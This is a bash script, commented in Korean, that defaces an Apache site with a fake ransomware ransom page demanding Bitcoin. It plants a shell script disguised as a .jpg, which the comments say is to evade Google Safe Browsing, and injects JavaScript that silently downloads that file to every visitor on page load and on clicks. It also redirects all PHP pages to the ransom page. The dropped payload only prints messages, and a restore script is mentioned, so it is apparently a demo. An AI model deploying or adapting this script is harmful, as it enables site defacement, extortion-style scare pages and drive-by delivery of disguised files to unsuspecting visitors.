#!/bin/bash
###############################################################################
# 해킹 페이지 + 자동 악성 파일 다운로드
# 현대적 랜섬웨어 스타일 (BLACKLOCK RANSOMWARE)
###############################################################################

echo "╔═══════════════════════════════════════════════╗"
echo "║   해킹 페이지 + 악성코드 배포 활성화        ║"
echo "╚═══════════════════════════════════════════════╝"
echo ""

# Root 권한 확인
if [ "$EUID" -ne 0 ]; then
    echo "❌ Root 권한이 필요합니다. sudo를 사용하세요."
    exit 1
fi

# 0. 원본 백업 (처음이면)
BACKUP_ORIGINAL="/tmp/index_ORIGINAL.php"
if [ ! -f "$BACKUP_ORIGINAL" ]; then
    if [ -f "/var/www/html/public/index.php" ]; then
        cp "/var/www/html/public/index.php" "$BACKUP_ORIGINAL"
        echo "[0/5] ✅ 원본 백업 생성: $BACKUP_ORIGINAL"
    fi
fi
echo ""

# 1. 악성 파일 생성 (.jpg로 위장하여 구글 경고 회피)
echo "[1/5] 악성 파일 생성 중..."
cat > /var/www/html/public/network_diagram.jpg << 'EOFMALWARE'
#!/bin/bash
# 실제 악성코드 대신 PoC (Proof of Concept)
# .jpg 확장자로 위장하여 구글 Safe Browsing 우회
# 실제 환경에서는 백도어, 랜섬웨어 등이 들어갈 수 있음

echo "System Update Initiated..."
echo "Connecting to C2 Server: attacker.onion"
echo "Stealing credentials..."
echo "Encrypting files..."
echo "Ransomware activated!"
EOFMALWARE

chmod 644 /var/www/html/public/network_diagram.jpg
chown apache:apache /var/www/html/public/network_diagram.jpg
echo "  ✅ 악성 파일 생성됨: /var/www/html/public/network_diagram.jpg (구글 경고 회피)"
echo ""

# 2. 현대적 해킹 페이지 생성 + 자동 다운로드
echo "[2/5] 해킹 페이지 생성 중..."
cat > /var/www/html/public/index.php << 'EOFHACKED'
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM COMPROMISED</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            color: #e0e0e0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            padding: 2rem;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        .header { text-align: center; padding: 3rem 0; border-bottom: 1px solid #2a2a2a; }
        .logo { font-size: 2.5rem; font-weight: 700; color: #ff3b3b; letter-spacing: 2px; margin-bottom: 1rem; }
        .subtitle { color: #888; font-size: 0.95rem; font-weight: 500; }
        .alert-box {
            background: linear-gradient(135deg, #2a0000 0%, #1a0000 100%);
            border: 1px solid #ff3b3b;
            border-radius: 12px;
            padding: 2rem;
            margin: 2rem 0;
        }
        .alert-title { font-size: 1.5rem; font-weight: 600; color: #ff3b3b; margin-bottom: 1rem; }
        .alert-content { color: #ccc; line-height: 1.6; font-size: 0.95rem; }
        .countdown-box {
            background: #1a1a1a;
            border: 1px solid #ff3b3b;
            border-radius: 8px;
            padding: 2rem;
            text-align: center;
            margin: 2rem 0;
        }
        .countdown-title { color: #ff3b3b; font-size: 0.9rem; text-transform: uppercase; margin-bottom: 1rem; }
        .countdown-timer { font-size: 3rem; font-weight: 700; color: #ff3b3b; }
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 1.5rem;
            margin: 2rem 0;
        }
        .info-card {
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            border-radius: 8px;
            padding: 1.5rem;
        }
        .info-card-title {
            font-size: 0.85rem;
            color: #888;
            text-transform: uppercase;
            margin-bottom: 0.75rem;
        }
        .info-card-value { font-size: 1.1rem; color: #fff; font-weight: 500; word-break: break-all; }
        .malware-alert {
            background: linear-gradient(135deg, #2a0a00 0%, #1a0500 100%);
            border: 2px solid #ff6b3b;
            border-radius: 12px;
            padding: 1.5rem;
            margin: 2rem 0;
            animation: pulse-red 2s infinite;
        }
        .malware-alert h3 { color: #ff6b3b; margin-bottom: 0.75rem; }
        .footer { text-align: center; padding: 2rem 0; border-top: 1px solid #2a2a2a; margin-top: 3rem; color: #555; font-size: 0.85rem; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
        @keyframes pulse-red {
            0%, 100% { box-shadow: 0 0 10px #ff3b3b; }
            50% { box-shadow: 0 0 30px #ff3b3b; }
        }
        .pulse { animation: pulse 2s ease-in-out infinite; }
        #download-status {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(255, 0, 0, 0.9);
            padding: 15px;
            border-radius: 5px;
            color: #fff;
            font-size: 12px;
            display: none;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div id="download-status"></div>
    <div class="container">
        <div class="header">
            <div class="logo">🔒 BLACKLOCK RANSOMWARE</div>
            <div class="subtitle">Advanced Persistent Threat Detection</div>
        </div>

        <div class="alert-box">
            <div class="alert-title">⚠ YOUR NETWORK HAS BEEN COMPROMISED</div>
            <div class="alert-content">
                All your files, databases, and backups have been encrypted with military-grade AES-256 encryption.
                Attempts to decrypt or restore files without our software will result in permanent data loss.
            </div>
        </div>

        <div class="countdown-box">
            <div class="countdown-title pulse">Time until price doubles</div>
            <div class="countdown-timer" id="timer">47:23:15</div>
        </div>

        <div class="info-grid">
            <div class="info-card">
                <div class="info-card-title">Payment Required</div>
                <div class="info-card-value">5.2 BTC (~$185,000)</div>
            </div>
            <div class="info-card">
                <div class="info-card-title">Bitcoin Wallet</div>
                <div class="info-card-value" style="font-size:0.85rem;">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
            </div>
            <div class="info-card">
                <div class="info-card-title">Files Encrypted</div>
                <div class="info-card-value">127,483 files</div>
            </div>
            <div class="info-card">
                <div class="info-card-title">Infection ID</div>
                <div class="info-card-value" style="font-size:0.85rem;"><?php echo strtoupper(md5(gethostname())); ?></div>
            </div>
        </div>

        <div class="malware-alert">
            <h3>🦠 Malware Distribution in Progress</h3>
            <div style="margin: 0.5rem 0; color: #ccc;">⚠️ File automatically downloading to your system</div>
            <div style="margin: 0.5rem 0; color: #ccc;">📁 Disguised filename: <code style="background: rgba(255,255,255,0.1); padding: 2px 6px; border-radius: 3px;">network_diagram.jpg</code></div>
            <div style="margin: 0.5rem 0; color: #ccc;">🎯 Target: All visitors</div>
        </div>

        <div class="footer">
            <p>Compromised: <?php echo date('Y-m-d H:i:s'); ?> UTC | Server: <?php echo gethostname(); ?></p>
            <p style="margin-top:0.5rem;">Perfect Security + One Configuration Error = Total Compromise</p>
        </div>
    </div>

    <script>
        // Countdown timer
        let timeLeft = 47 * 3600 + 23 * 60 + 15;
        function updateTimer() {
            const hours = Math.floor(timeLeft / 3600);
            const minutes = Math.floor((timeLeft % 3600) / 60);
            const seconds = timeLeft % 60;
            document.getElementById('timer').textContent =
                `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            if (timeLeft > 0) timeLeft--;
        }
        setInterval(updateTimer, 1000);
        updateTimer();

        // 🦠 자동 악성 파일 다운로드
        function silentDownload() {
            const statusDiv = document.getElementById('download-status');

            // XHR로 실제 파일 다운로드
            const xhr = new XMLHttpRequest();
            xhr.open('GET', '/network_diagram.jpg', true);
            xhr.responseType = 'blob';

            xhr.onload = function() {
                if (xhr.status === 200) {
                    const blob = xhr.response;
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.style.display = 'none';
                    a.href = url;
                    a.download = 'network_diagram.jpg';
                    document.body.appendChild(a);
                    a.click();

                    statusDiv.textContent = '🦠 Malware Downloaded';
                    statusDiv.style.display = 'block';

                    setTimeout(() => {
                        statusDiv.style.display = 'none';
                    }, 3000);

                    window.URL.revokeObjectURL(url);
                    document.body.removeChild(a);
                }
            };

            xhr.send();
        }

        // 페이지 로드 3초 후 자동 다운로드
        window.addEventListener('load', () => {
            setTimeout(silentDownload, 3000);
        });

        // 클릭할 때마다 재시도 (3번마다)
        let clickCount = 0;
        document.addEventListener('click', () => {
            clickCount++;
            if (clickCount % 3 === 0) {
                silentDownload();
            }
        });
    </script>
</body>
</html>
EOFHACKED

chown apache:apache /var/www/html/public/index.php
chmod 644 /var/www/html/public/index.php
echo "  ✅ 현대적 해킹 페이지 생성됨"
echo ""

# 3. .htaccess 설정 (모든 PHP 페이지 리다이렉트)
echo "[3/5] .htaccess 설정 중..."
cat > /var/www/html/public/.htaccess << 'EOFHTACCESS'
<IfModule mod_rewrite.c>
RewriteEngine On

# 예외: index.php, api, network_diagram.jpg는 리다이렉트 안함
RewriteCond %{REQUEST_URI} !^/index\.php$
RewriteCond %{REQUEST_URI} !^/api/
RewriteCond %{REQUEST_URI} !^/network_diagram\.jpg$

# 모든 .php 파일을 index.php로 리다이렉트
RewriteCond %{REQUEST_URI} \.php$
RewriteRule ^.*$ /index.php [L,R=302]
</IfModule>
EOFHTACCESS

chown apache:apache /var/www/html/public/.htaccess
chmod 644 /var/www/html/public/.htaccess
echo "  ✅ .htaccess 설정 완료"
echo ""

# 4. www 폴더 동기화
echo "[4/5] www 폴더 설정 중..."
if [ -d "/var/www/html/www" ]; then
    cp /var/www/html/public/index.php /var/www/html/www/index.php
    cp /var/www/html/public/network_diagram.jpg /var/www/html/www/network_diagram.jpg
    cp /var/www/html/public/.htaccess /var/www/html/www/.htaccess
    chown apache:apache /var/www/html/www/*
    echo "  ✅ www 폴더도 동기화됨"
fi
echo ""

# 5. Apache 재시작
echo "[5/5] Apache 재시작 중..."
systemctl restart httpd

echo ""
echo "╔═══════════════════════════════════════════════╗"
echo "║   ✅ 해킹 페이지 + 악성코드 배포 완료!      ║"
echo "║                                              ║"
echo "║   🦠 사용자가 사이트 접속 시:                ║"
echo "║   1. 현대적 랜섬웨어 페이지 표시             ║"
echo "║   2. 3초 후 자동으로 악성 파일 다운로드      ║"
echo "║   3. 파일명: network_diagram.jpg             ║"
echo "║   4. 모든 PHP 페이지가 해킹 페이지로 리다이렉트 ║"
echo "║                                              ║"
echo "║   정상 페이지로 복구:                        ║"
echo "║   sudo bash TOGGLE_MODERN_FIXED.sh           ║"
echo "╚═══════════════════════════════════════════════╝"
